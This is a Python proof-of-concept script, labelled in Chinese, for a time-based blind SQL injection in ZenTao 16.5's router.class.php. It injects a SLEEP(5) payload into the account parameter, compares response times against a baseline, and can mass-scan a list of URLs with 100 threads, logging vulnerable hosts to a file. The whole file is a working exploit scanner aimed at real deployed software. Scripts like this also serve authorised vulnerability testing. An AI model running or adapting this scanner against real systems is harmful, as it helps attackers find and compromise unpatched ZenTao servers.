import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________               ________                    ____________________ 
__  ____/__  /_______ __________  __ \_____ ______       __  ___/_  __ \__  / 
_  /    __  __ \  __ `/_  __ \_  / / /  __ `/  __ \___________ \_  / / /_  /  
/ /___  _  / / / /_/ /_  / / /  /_/ // /_/ // /_/ //_____/___/ // /_/ /_  /___
\____/  /_/ /_/\__,_/ /_/ /_//_____/ \__,_/ \____/       /____/ \___\_\/_____/
                                                                              """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='禅道 16.5 router.class.php SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/index.php%3Faccount%3Dadmin%27%20AND%20%28SELECT%201337%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--%20b'
    payload2 = '/index.php%3Faccount%3Dadmin'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
    }
    try:
        res1 = requests.get(url=target+payload1,headers=headers,verify=False)
        res2 = requests.get(url=target+payload2,headers=headers,verify=False)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1-time2 >= 4:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()